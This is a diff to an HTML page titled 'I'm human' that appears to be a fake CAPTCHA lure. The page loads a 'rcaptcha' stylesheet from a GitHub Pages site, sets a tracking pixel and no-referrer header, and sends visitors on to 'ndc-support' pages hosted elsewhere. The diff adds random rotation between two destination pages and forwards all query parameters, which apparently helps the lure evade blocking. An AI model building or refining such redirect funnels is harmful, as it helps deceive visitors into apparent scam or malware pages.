@@ -24,21 +24,28 @@ src="https://www.facebook.com/tr?id=738451622060677&ev=PageView&noscript=1"
     <meta name="referrer" content="no-referrer">
     <link href="https://gwill003.github.io/win.kanex/rcaptcha/public/css/common.css" rel="stylesheet">
     <script>
-        window.__PAGE_CONFIG__ = {
-            lang: "en",
-            offer: "digital-marketing",
-            redirectUrl: "https://vaazat.github.io/supports/ndc-support.html"
-        };
-    
-        const urlParams = new URLSearchParams(window.location.search);
-        const redirectUrl = new URL(window.__PAGE_CONFIG__.redirectUrl);
-    
-        for (const [key, value] of urlParams) {
-            redirectUrl.searchParams.set(key, value);
-        }
-    
-        window.__PAGE_CONFIG__.redirectUrl = redirectUrl.toString();
-    </script>    <meta charset="utf-8">
+    const urls = [
+        "https://vaazat.github.io/supports/ndc-support.html",
+        "https://vaazat.github.io/supports/ndc-campaign.html"
+    ];
+
+    window.__PAGE_CONFIG__ = {
+        lang: "en",
+        offer: "digital-marketing",
+        redirectUrl: urls[Math.floor(Math.random() * urls.length)]
+    };
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const redirectUrl = new URL(window.__PAGE_CONFIG__.redirectUrl);
+
+    for (const [key, value] of urlParams) {
+        redirectUrl.searchParams.set(key, value);
+    }
+
+    window.__PAGE_CONFIG__.redirectUrl = redirectUrl.toString();
+    </script>
+  
+  <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>I&#x27;m human</title>
     <script>
